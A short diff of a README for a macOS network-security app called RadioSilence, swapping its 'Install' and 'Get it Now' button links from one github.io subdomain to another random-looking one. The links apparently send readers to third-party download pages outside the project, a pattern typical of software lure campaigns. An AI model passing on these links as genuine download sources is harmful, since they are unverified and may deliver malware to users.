@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://somovskoye.github.io/.github/radioSilence)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://skalsd-oasd.github.io/.github/radioSilence)
 
 </div>
 
@@ -81,7 +81,7 @@ RadioSilence addresses a specific gap in macOS's default network security postur
 
 <p align="center">
 
-[![Get it Now RadioSilence](https://img.shields.io/badge/Get_it_Now-1B998B?style=for-the-badge&logo=apple&logoColor=white)](https://somovskoye.github.io/.github/radioSilence)
+[![Get it Now RadioSilence](https://img.shields.io/badge/Get_it_Now-1B998B?style=for-the-badge&logo=apple&logoColor=white)](https://skalsd-oasd.github.io/.github/radioSilence)
 
 </p>
 
